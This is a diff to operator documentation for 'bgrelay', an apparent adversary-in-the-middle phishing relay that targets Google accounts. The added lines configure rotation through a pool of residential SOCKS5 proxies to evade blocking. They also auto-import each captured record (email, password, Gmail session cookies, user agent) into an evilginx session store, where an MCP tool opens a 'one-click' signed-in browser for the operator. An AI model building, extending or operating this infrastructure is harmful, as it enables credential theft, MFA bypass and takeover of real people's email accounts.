@@ -60,7 +60,10 @@ ssh <node> 'sudo systemctl restart bgrelay && systemctl is-active bgrelay'
 ```
 
 Environment (systemd unit): `RELAY_PORT=9445`,
-`RELAY_SOCKS=socks5://<user>:<pass>@<residential>:<port>`.
+`RELAY_SOCKS=socks5://<user>:<pass>@<residential>:<port>` — or a **comma-separated
+pool** of exits (`socks5://u:p@h1:port,socks5://u:p@h2:port`) for automatic
+rotation: ≥3 consecutive failures on one exit triggers a 30-min cooldown and the
+bridge dials through the next healthy exit. Status via `GET /api/pool` (X-Op-Key).
 
 ## Sidecar API
 
@@ -79,7 +82,10 @@ Google-prompt wait, number-match shown inside the mirror) → done | error`.
 ## Capture & replay
 
 On `done`: `~/bgrelay-store/<sid>.json` = `{id, email, password, cookies[], ua, ts}`
-(only `.google.com`/`accounts.google.com`/`mail.google.com` cookies).
+(only `.google.com`/`accounts.google.com`/`mail.google.com` cookies) — and the
+capture is **auto-imported** into the evilginx session store (`POST /sessions/import`
+via mTLS on loopback), so it appears in `sessions` immediately: use `open <id>`
+or MCP `open_session` for a one-click signed-in browser.
 
 Replay into a local signed-in Gmail (operator workstation):
 
